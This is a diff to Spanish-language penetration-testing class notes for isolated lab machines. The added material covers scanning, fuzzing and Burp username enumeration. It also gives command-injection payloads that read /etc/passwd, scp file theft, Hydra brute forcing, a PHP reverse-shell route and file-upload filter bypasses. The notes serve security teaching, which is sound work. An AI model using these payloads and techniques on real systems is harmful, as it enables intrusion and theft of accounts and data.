@@ -10,8 +10,19 @@
 
 La máquina vulnerable se importa directamente desde un fichero `.ova` en VirtualBox. Atacante (Kali Linux) y víctima comparten la misma red NAT para tener visibilidad mutua.
 
+| Rol | Sistema |
+|-----|---------|
+| **Atacante** | Kali Linux actualizada |
+| **Víctima** | Metasploitable 2 / máquina vulnerable (IP ejemplo: 10.0.2.15) |
+
 > [!tip] Formato de práctica
 > Un alumno actúa como atacante tomando decisiones en tiempo real. El resto de la clase observa y participa. Esta metodología simula la dinámica real de una auditoría.
+
+> [!warning] Regla de laboratorio
+> La VM **nunca** se expone a internet: red aislada (NAT interno o host-only). Un Metasploitable en una red real es un regalo para cualquier atacante.
+
+> [!tip] VMware vs VirtualBox
+> En clase se recomienda **VMware**: VirtualBox suele dar problemas con el portapapeles bidireccional y el arrastre de archivos. Alternativa para transferir ficheros: carpeta compartida host↔VM.
 
 ---
 
@@ -58,10 +69,18 @@ nmap -sC -sV 10.0.2.15
 nmap -sC -sV -p- 10.0.2.15
 
 # Reveló puertos adicionales: 22222 (SSH real) y 60000 (reverse shell parcial)
+
+# Variante agresiva (clase Metasploitable):
+nmap -sCV 10.0.2.15 --min-rate=5000 -p-
+# -sCV = -sC + -sV · --min-rate acelera sin perder cobertura
+# Presionar V durante el escaneo para ver el porcentaje
 ```
 
 > [!tip] Metodología ante servicios con login
 > Tres vectores posibles: (1) fuerza bruta, (2) versión con CVE explotable, (3) mala configuración. Explorar en ese orden.
+
+> [!warning] -sC vs -sCV y el puerto 22 "falso"
+> Sin `-sV`/`-sCV`, Nmap muestra el servicio **esperado por defecto** en cada puerto. Con descubrimiento activo revela lo real: el 22 puede ser tcpwrapped (muerto) y el SSH auténtico estar en otro puerto (22222 en esta máquina).
 
 ---
 
@@ -146,14 +165,61 @@ feroxbuster -u http://10.0.2.15 -w /usr/share/wordlists/dirbuster/directory-list
 
 | Herramienta | Característica principal |
 |------------|------------------------|
-| **DirSearch** | Diccionario propio incluido. Buena opción por defecto. |
-| **ffuf** | Muy rápido, muy flexible. Soporta fuzzing de subdominios. |
+| **DirSearch** | Diccionario propio incluido. Buena opción por defecto. `-r` activa recursividad. |
+| **ffuf** | Muy rápido, muy flexible. Soporta fuzzing de subdominios (FUZZ al inicio de la URL). |
 | **Feroxbuster** | Recursivo por defecto. Encuentra directorios anidados. |
 | **GoBuster** | Rápido, múltiples modos (dir, dns, vhost). |
 | **DirBuster** | Versión gráfica (Java). Más lenta. |
+| **Metasploit dir_scanner** | `use auxiliary/scanner/http/dir_scanner` — rápido pero menos completo que ffuf con diccionario grande. |
 
 > [!tip] Todas las herramientas de fuzzing hacen lo mismo
 > La diferencia es el diccionario por defecto y la velocidad. Con el mismo diccionario los resultados son idénticos.
+
+### Diccionarios recomendados
+
+| Diccionario | Uso principal |
+|-------------|--------------|
+| `directory-list-2.3-medium.txt` | Fuzzing web (ya en Kali) |
+| `common.txt` (dirb) | Fuzzing rápido |
+| **SecLists** (`raft-medium-directories`, `common-php`...) | Todo: dirs, usuarios, contraseñas, SQLi, LFI |
+| **PayloadsAllTheThings** | Payloads web: XSS, SQLi, LFI |
+
+```bash
+# Recursividad en dirsearch (clave en Academy: sin -r no ves /wordpress/*)
+dirsearch -u http://IP/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+# ffuf con colores
+ffuf -u http://IP/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+> [!important] REGLA DE ORO — robots.txt siempre
+> **Siempre** buscar `robots.txt` (y en subdirectorios). Contiene los directorios que el propietario **no quiere que Google indexe** — para el pentester son los más interesantes.
+
+### Códigos HTTP de respuesta
+
+| Código | Significado |
+|--------|------------|
+| 200 | OK — recurso existe y se sirve |
+| 301 / 302 | Redirección (frecuente: dominio real ≠ IP → `/etc/hosts`) |
+| 403 | Existe pero prohibido |
+| 404 | No encontrado |
+
+Truco mnemotécnico: https://http.cat
+
+### Paso 4 — Analizar funcionalidades (Burp Suite)
+
+Un proxy como **Burp Suite** se interpone entre navegador y servidor: `Navegador → [Burp] → Servidor`. Con FoxyProxy (`127.0.0.1:8080`) se activa con un clic.
+
+- **Intercept ON**: cada petición queda retenida hasta Forward
+- **HTTP History**: con Intercept OFF sigue registrando todo → auditar sin interrumpir
+- **Repeater**: reenviar la misma petición modificada
+- **Intruder**: ataque masivo con diccionario sobre un parámetro
+
+> [!tip] Enumeración de usuarios por longitud de respuesta
+> En Intruder se marca el campo usuario; un "invalid username" mide ~4065 bytes y un "password incorrect" ~4116 → **longitud distinta = usuario válido**. Aplicado en Mr. Robot sobre `/wp-login.php`.
+
+> [!warning] Information disclosure en logins
+> Un login bien diseñado da un mensaje genérico ("usuario o contraseña incorrectos"). Si distingue "usuario inválido" de "contraseña incorrecta", revela qué usuarios existen. En WordPress es opción de configuración, no fallo de versión.
 
 ---
 
@@ -181,8 +247,23 @@ En el directorio `cgi-bin` hay una página que implementa un traceroute: el usua
 |----------|----------------------|------------------------|
 | `;` | Ejecuta siempre ambos comandos | El más común. Funciona aunque el primer comando falle. |
 | `&&` | Ejecuta el segundo solo si el primero tiene éxito | Útil cuando el primer comando debe completarse. |
-| `|` | Pipe: stdout del primero → stdin del segundo | Para filtrar o procesar la salida. |
-| `||` | Ejecuta el segundo solo si el primero falla | Útil para bypass de validaciones. |
+| `\|` | Pipe: stdout del primero → stdin del segundo | Para filtrar o procesar la salida. |
+| `\|\|` | Ejecuta el segundo solo si el primero falla | Útil para bypass de validaciones. |
+
+### Confirmación y enumeración
+
+```bash
+# Confirmar RCE (ejemplos de clase):
+10.0.2.15; whoami        # → www-data (cuenta de servicio de Apache)
+8.8.8.8; whoami           # concatenación clásica de traceroute
+10.0.2.15; id
+10.0.2.15; head -200 /etc/passwd
+10.0.2.15; tree /var/www/www
+10.0.2.15; ls /home
+```
+
+> [!info] www-data
+> Es la cuenta de servicio de Apache: si comprometes la web obtienes `www-data`, un usuario muy limitado. Siguiente paso: enumerar el sistema y escalar (usuario local → root).
 
 > [!info] La solución al Command Injection
 > Misma que para SQL Injection: validación estricta del input. Si esperas una IP, valida que el campo contenga exactamente 4 grupos numéricos separados por puntos y rechaza cualquier otro carácter.
@@ -261,7 +342,87 @@ nc 10.0.2.15 60000
 
 ---
 
-## ⑪ Resumen: vectores y hallazgos
+## ⑪ Post-explotación y movimiento lateral
+
+Con acceso SSH (o reverse shell) empieza la enumeración interna:
+
+```bash
+cat /etc/passwd          # usuarios reales
+sudo -l                  # qué puedo ejecutar como root sin contraseña
+uname -a                 # kernel / SO
+find / -perm -4000 2>/dev/null   # binarios SUID
+```
+
+> [!info] sudo -l vs SUID
+> `sudo -l` lista comandos que mi usuario ejecuta como root (reglas predefinidas). El **bit SUID** son ficheros concretos que corren con permisos de su propietario.
+
+### Transferencia de ficheros: cp y scp
+
+```bash
+# Copia interna (origen legible + destino escribible):
+cp /home/user/fichero /tmp/
+
+# Descargar de la víctima a Kali (¡ojo al puerto no estándar!):
+scp -P 22222 summer@10.0.2.15:/home/Morty/Safe_Password.jpg .
+
+# Subir a la víctima (invertir origen y destino):
+scp -P 22222 payload.sh summer@10.0.2.15:/tmp/
+```
+
+### Análisis de ficheros robados
+
+```bash
+exiftool imagen.jpg    # metadatos
+strings binario        # cadenas legibles (steganografía / credenciales ocultas)
+unzip archivo.zip      # si pide contraseña → diccionario contextual
+```
+
+> [!tip] Generar diccionario a partir de pistas
+> Si la contraseña sigue una política (mayúscula + dígito + palabra clave), generar solo esas combinaciones y pasarla a Hydra: `hydra -l user -P diccionario.txt ssh://IP:22222`. Sanitizar diccionarios ajenos: `sort dic | uniq > dic_clean`.
+
+---
+
+## ⑫ Cadenas completas de explotación
+
+### RickdiculouslyEasy (práctica de clase)
+
+```
+netdiscover → nmap -p- → FTP anon (flag)
+  → robots.txt + código fuente → /passwords/ → winter
+  → Command Injection cgi-bin → /etc/passwd → usuarios
+  → SSH:22222 como summer → robo de ficheros (scp)
+  → strings/zip → pista de política → diccionario → Hydra → RickSanchez
+  → sudo -l → (ALL:ALL) ALL → sudo su → root
+```
+
+| Puerto | Servicio | Vector | Hallazgo |
+|--------|---------|--------|---------|
+| **21** | FTP | Login anónimo (anonymous) | flag.txt en /pub/ |
+| **80** | HTTP | robots.txt → directorio /passwords/ | flag.txt + passwords.html (credenciales) |
+| **80 / cgi-bin** | HTTP | Command Injection (;whoami) | Usuarios del sistema desde /etc/passwd |
+| **9090** | Cockpit | Rabbit hole — sin vector sin auth | Descartado |
+| **22222** | SSH | Credenciales: Summer / winter | Shell en el servidor |
+| **60000** | TCP | Reverse shell parcial (nc) | flag.txt (shell restringida) |
+
+### Academy (WordPress — ver [[WordPress - Auditoría con WPScan]])
+
+```
+netdiscover → nmap (22, 80) → dirsearch -r → /wordpress (301)
+  → /etc/hosts → WPScan → 6.5.3 + usuarios + Elementor
+  → brute force rockyou → Dylan / password1 → /wp-admin
+  → editor de temas 404.php → reverse shell PHP → www-data
+  → estabilizar TTY → (privesc pendiente)
+```
+
+> [!tip] El acceso completo se consiguió sin ningún exploit sofisticado
+> Enumeración metódica (Nmap), curiosidad ante cada funcionalidad (robots.txt, código fuente) y correlacionar información de varias fuentes (usuarios de /etc/passwd + contraseña de la web).
+
+> [!info] File Upload como alternativa a editor de temas
+> Si la web permite subir ficheros, una reverse shell PHP (o msfvenom `php/meterpreter/reverse_tcp`) en la ruta de uploads (`/var/www/.../images/tmp/shell.php`) da el mismo resultado que el editor de Temas. Bypasses típicos: extensión doble (`shell.php.jpg`), `.phtml`/`.php5`, null byte (`shell.php%00.jpg`), `.htaccess` (`AddType application/x-httpd-php .jpg`).
+
+---
+
+## ⑬ Resumen: vectores y hallazgos
 
 | Puerto | Servicio | Vector | Hallazgo |
 |--------|---------|--------|---------|
@@ -277,7 +438,7 @@ nc 10.0.2.15 60000
 
 ---
 
-## ⑫ Metodología integrada de auditoría web
+## ⑭ Metodología integrada de auditoría web
 
 | Fase | Acciones |
 |------|---------|
@@ -288,6 +449,7 @@ nc 10.0.2.15 60000
 | **5. Información extraída** | Guardar TODO: usuarios, contraseñas, hashes, rutas, versiones |
 | **6. Correlacionar hallazgos** | Credenciales de un servicio usadas en otro (pivoting de info) |
 | **7. Descartar rabbit holes** | Sin autenticación no se puede explotar CVE que la requiere → siguiente |
+| **8. Post-explotación** | Estabilizar shell → sudo -l / SUID → mover entre usuarios → root |
 
 ---
 
@@ -297,11 +459,19 @@ nc 10.0.2.15 60000
 - [ ] ¿Comprendo la diferencia entre -sC -sV y -p-?
 - [ ] ¿Sé conectarme a FTP anónimo y navegar sus comandos?
 - [ ] ¿Entiendo la metodología web: código fuente → robots.txt → dirsearch → explotar?
-- [ ] ¿Sé identificar y explotar un Command Injection?
+- [ ] ¿Uso fuzzing recursivo y conozco los diccionarios clave?
+- [ ] ¿Sé interpretar los códigos HTTP y localizar robots.txt en subdirectorios?
+- [ ] ¿Sé interceptar con Burp y enumerar usuarios por longitud de respuesta?
+- [ ] ¿Sé identificar y explotar un Command Injection (; y &&)?
 - [ ] ¿Leo /etc/passwd para distinguir cuentas de servicio vs usuarios reales?
 - [ ] ¿Sé que el SSH puede estar en puertos no estándar y siempre escaneo -p-?
 - [ ] ¿Identifico un rabbit hole y sé cuándo dejar de invertir tiempo?
+- [ ] ¿Transfiero ficheros con scp -P y los analizo con strings/exiftool?
+- [ ] ¿Genero diccionarios contextuales para Hydra?
+- [ ] ¿Recorro sudo -l y find SUID tras obtener una shell?
 - [ ] ¿Recuerdo siempre guardar TODO: usuarios, contraseñas, hashes, rutas?
+
+
 
 
 
@@ -315,29 +485,15 @@ nc 10.0.2.15 60000
 
 ### Documentos Relacionados
 
-- [[../../apuntes Chema/Auditoria web.md|Auditoria web]] — Command Injection / RCE, Feroxbuster, WordPress
-- [[../../apuntes Chema/Maquinas/Auditoría de CMS - WordPress (máquina Academy).md|Auditoría de CMS - WordPress (máquina Academy)]] — Command Injection / RCE, Feroxbuster, WordPress
-- [[../../write-ups/Academy-THL.md|Academy-THL]] — File Upload, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Joselu/MODULO3/resumen_master_clase45.md|resumen_master_clase45]] — File Upload, Metasploit, Netcat / Reverse Shells
-- [[../../informes/Informe_Academy.md|Informe_Academy]] — File Upload, Metasploit, Netcat / Reverse Shells
-- [[../../apuntes Joselu/MODULO3/resumen_master_clase39.md|resumen_master_clase39]] — Command Injection / RCE, Feroxbuster, WordPress
+- [[../../apuntes Chema/Auditoria web.md|Auditoria web]] — GoBuster, Kali Linux, Seguridad
+- [[../../apuntes Chema/Maquinas/Auditoría de CMS - WordPress (máquina Academy).md|Auditoría de CMS - WordPress (máquina Academy)]] — GoBuster, Kali Linux, Seguridad
+- [[../../write-ups/Academy-THL.md|Academy-THL]] — File Upload, GoBuster, Kali Linux
+- [[../../apuntes Joselu/MODULO3/resumen_master_clase45.md|resumen_master_clase45]] — GoBuster, Kali Linux, Seguridad
+- [[../../apuntes Joselu/MODULO3/resumen_master_clase39.md|resumen_master_clase39]] — File Upload, GoBuster, Kali Linux
 
-### 🛠️ Herramientas
+### 🌐 Cross-Dominio
 
-- [[comandos/BurpSuite|Burp Suite]]
-- [[comandos/DirSearch|DirSearch]]
-- [[comandos/Feroxbuster|Feroxbuster]]
-- [[comandos/FFUF|FFUF]]
-- [[comandos/GoBuster|GoBuster]]
-- [[comandos/Hydra|Hydra]]
-- [[comandos/Metasploit|Metasploit]]
-- [[comandos/Metasploit|Netcat / Reverse Shells]]
-- [[comandos/Nmap|Nmap]]
-- [[comandos/SSH|SSH]]
+- [[../../../programacion/Node/seguridad_node.md|seguridad_node]] — Programacion: Desarrollo Web, Funcional, Seguridad
+- [[../../../programacion/Java/seguridad_java.md|seguridad_java]] — Programacion: Desarrollo Web, Linux, Seguridad
 
-### 🎯 Vulnerabilidades Relacionadas
-
-- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
-- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
-
-> #burpsuite #command-injection #dirsearch #feroxbuster #ffuf #file-upload #gobuster #hydra #kali #linux #metasploit #netcat #nmap #pentest #pivoting #post-explotacion #redes #reverse-shell #sqli #ssh #wordpress
+> #burpsuite #cli #cloud_base #command_injection #dirsearch #feroxbuster #ffuf #file_upload #funcional #gobuster #hydra #java #javascript #kali #linux #linux_ciber #metasploit #netcat #nmap #pentest #pivoting #post_explotacion #redes #redes_ciber #reverse_shell #seguridad #sql #sqli #ssh_tool #web #wordpress
